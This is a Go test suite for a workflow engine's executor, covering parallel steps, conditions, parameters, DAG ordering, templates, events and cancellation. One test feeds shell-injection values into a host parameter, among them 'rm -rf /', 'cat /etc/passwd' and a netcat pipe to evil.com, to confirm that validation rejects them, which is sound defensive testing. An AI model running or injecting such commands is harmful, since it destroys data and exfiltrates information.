package engine

import (
	"context"
	"log/slog"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"
	"github.com/tailflow/tailflow/internal/action"
	"github.com/tailflow/tailflow/internal/event"
	"github.com/tailflow/tailflow/internal/parser"
)

func newTestExecutor() (*Executor, *event.Bus) {
	bus := event.NewBus()
	reg := action.NewRegistry()
	action.RegisterBuiltins(reg)
	logger := slog.Default()
	return NewExecutor(reg, bus, logger), bus
}

type EngineTestSuite struct {
	suite.Suite
}

func TestEngine(t *testing.T) {
	suite.Run(t, new(EngineTestSuite))
}

func (s *EngineTestSuite) SetupTest() {}

func (s *EngineTestSuite) TestSimpleWorkflow() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "test",
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "hello"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("success", result.Steps["log1"].Status)
}

func (s *EngineTestSuite) TestParallelSteps() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Two independent steps that should run in parallel
	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "parallel",
		Steps: []parser.Step{
			{
				ID:     "a",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:     "b",
				Action: "delay",
				Config: map[string]any{"duration": "50ms"},
			},
			{
				ID:        "c",
				Action:    "log",
				DependsOn: []string{"a", "b"},
				Config:    map[string]any{"message": "done"},
			},
		},
	}

	start := time.Now()
	result, err := exec.Execute(context.Background(), wf, nil)
	elapsed := time.Since(start)

	s.Require().NoError(err)
	s.Equal("success", result.Status)
	// If parallel, should take ~50ms not ~100ms
	s.Less(elapsed, 150*time.Millisecond)
}

func (s *EngineTestSuite) TestWhenCondition() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "conditional",
		Params:  []parser.Param{{Name: "skip", Type: "bool", Default: true}},
		Steps: []parser.Step{
			{
				ID:     "maybe",
				Action: "log",
				When:   "params.skip == false",
				Config: map[string]any{"message": "should not run"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
	s.Equal("skipped", result.Steps["maybe"].Status)
}

func (s *EngineTestSuite) TestParamDefaults() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Default: "staging"},
		},
		Steps: []parser.Step{
			{
				ID:     "log1",
				Action: "log",
				Config: map[string]any{"message": "env={{ params.env }}"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestRequiredParamMissing() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "params",
		Params: []parser.Param{
			{Name: "env", Type: "string", Required: true},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "test"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Error(err)
	s.Contains(err.Error(), "required parameter")
}

func (s *EngineTestSuite) TestParamPatternValid() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr"})
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestParamPatternInjection() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "pattern-test",
		Params: []parser.Param{
			{Name: "host", Type: "string", Pattern: "[a-zA-Z0-9._-]+"},
		},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ params.host }}"}},
		},
	}

	// Injection attempt with &&
	_, err := exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr && rm -rf /"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with ;
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr; cat /etc/passwd"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")

	// Injection attempt with |
	_, err = exec.Execute(context.Background(), wf, map[string]any{"host": "google.fr | nc evil.com 4444"})
	s.Error(err)
	s.Contains(err.Error(), "does not match pattern")
}

func (s *EngineTestSuite) TestDAGDependencies() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	// Track execution order
	var order []string
	var orderMu atomic.Int32

	ch := bus.Subscribe(100)
	go func() {
		for ev := range ch {
			if ev.Type == event.StepCompleted {
				order = append(order, ev.StepID)
				orderMu.Add(1)
			}
		}
	}()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "dag",
		Steps: []parser.Step{
			{ID: "a", Action: "set", Config: map[string]any{"val": "a"}},
			{ID: "b", Action: "set", DependsOn: []string{"a"}, Config: map[string]any{"val": "b"}},
			{ID: "c", Action: "set", DependsOn: []string{"b"}, Config: map[string]any{"val": "c"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)

	// Wait for all 3 StepCompleted events to be collected
	s.Eventually(func() bool {
		return orderMu.Load() >= 3
	}, 2*time.Second, 10*time.Millisecond)

	// a must come before b, b before c
	aIdx, bIdx, cIdx := -1, -1, -1
	for i, id := range order {
		switch id {
		case "a":
			aIdx = i
		case "b":
			bIdx = i
		case "c":
			cIdx = i
		}
	}
	s.Less(aIdx, bIdx)
	s.Less(bIdx, cIdx)
}

func (s *EngineTestSuite) TestTemplateResolution() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "templates",
		Params:  []parser.Param{{Name: "name", Type: "string", Default: "World"}},
		Steps: []parser.Step{
			{
				ID:     "greet",
				Action: "log",
				Config: map[string]any{"message": "Hello, {{ params.name }}!"},
			},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestEventsPublished() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ch := bus.Subscribe(100)

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "events",
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "hi"}},
		},
	}

	_, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)

	// Wait for all expected event types to be published
	var events []event.Event
	s.Eventually(func() bool {
		for {
			select {
			case e := <-ch:
				events = append(events, e)
			default:
				types := make(map[event.EventType]bool)
				for _, e := range events {
					types[e.Type] = true
				}
				return types[event.WorkflowStarted] &&
					types[event.StepStarted] &&
					types[event.StepCompleted] &&
					types[event.WorkflowCompleted]
			}
		}
	}, 2*time.Second, 10*time.Millisecond)
}

func (s *EngineTestSuite) TestEnvResolution() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "env-test",
		Params:  []parser.Param{{Name: "region", Type: "string", Default: "us-east"}},
		Env:     map[string]string{"API_URL": "https://api.{{ params.region }}.example.com"},
		Steps: []parser.Step{
			{ID: "s1", Action: "log", Config: map[string]any{"message": "{{ env.API_URL }}"}},
		},
	}

	result, err := exec.Execute(context.Background(), wf, nil)
	s.Require().NoError(err)
	s.Equal("success", result.Status)
}

func (s *EngineTestSuite) TestCancelledContext() {
	exec, bus := newTestExecutor()
	defer bus.Close()

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	wf := &parser.Workflow{
		Version: "2.0",
		Name:    "cancel",
		Steps: []parser.Step{
			{ID: "s1", Action: "delay", Config: map[string]any{"duration": "10s"}},
		},
	}

	result, err := exec.Execute(ctx, wf, nil)
	s.Require().NoError(err)
	s.Equal("cancelled", result.Status)
}
